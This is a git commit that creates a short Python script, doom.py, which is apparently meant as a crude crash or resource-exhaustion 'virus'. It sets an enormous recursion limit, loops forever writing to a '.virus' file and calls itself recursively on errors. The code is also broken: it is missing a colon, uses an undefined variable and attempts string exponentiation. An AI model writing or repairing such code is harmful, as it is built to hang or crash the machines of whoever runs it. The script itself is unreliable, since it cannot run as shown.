8915edd5c7bf9903d5fc308e5efd6e9d1850b4c4
Md Josif Khan <114861784+josifkhan@users.noreply.github.com>
2023-12-09 16:43:11 +0600

    Create doom.py

---
+++ doom.py
@@ -0,0 +1,9 @@
+import sys
+def tryx()
+  sys.setrecursionlimit(999999999)
+  josifkhan = 'josifkhan'
+  xx = 20
+  while True:
+    try:x+=20;open('.virus','w',encoding='utf-8').write(f'{josifkhan**x}///{josifkhan**x}')
+    except:tryx()
+tryx()
